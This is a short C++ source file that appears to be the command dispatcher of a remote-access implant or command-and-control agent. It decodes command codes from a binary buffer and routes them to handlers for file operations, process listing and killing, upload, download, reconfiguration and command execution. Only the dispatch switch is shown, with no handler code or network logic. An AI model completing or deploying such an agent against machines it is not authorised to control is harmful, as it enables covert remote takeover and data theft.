#include "cmds.hpp"
#include <stdio.h>






BOOL commanders::Dispatch(PBYTE Data, UINT size, PBYTE OutBuffer) {
	g_ByteMgr->InitRead(Data, size);
	UINT TotalCommands = g_ByteMgr->Read4();
	for (INT i = 0; i < TotalCommands; i++) {
		UINT CmdCode = g_ByteMgr->Read4();
		switch (CmdCode)
		{
		case CMD_CODE_PROC_LIST:
			do_proc_list();
			break;
		case CMD_CODE_LS:
			do_ls();
			break;
		case CMD_CODE_MV:
			do_mv();
			break;

		case CMD_CODE_PWD:
			do_pwd();
			break;

		case CMD_CODE_CD:
			do_cd();
			break;

		case CMD_CODE_CAT:
			do_cat();
			break;

		case CMD_CODE_CP:
			do_cp();
			break;

		case CMD_CODE_RMDIR:
			do_rmdir();
			break;

		case CMD_CODE_RM:
			do_rm();
			break;

		case CMD_CODE_WHOAMI:
			do_whoami();
			break;
		case CMD_CODE_MKDIR:
			do_mkdir();
			break;
		case CMD_CODE_UPLOAD:
			do_upload();
			break;
		case CMD_CODE_DOWNLOAD:
			do_download();
			break;
		case CMD_CODE_RECONFIG:
			do_reconfig();
			break;
		case CMD_CODE_PROC_KILL:
			do_proc_kill();
			break;
		case CMD_CODE_EXEC:
			do_exec();
			break;
		default:
			break;
		}

	}

	return TRUE;
}



commanders* g_Commander = NULL;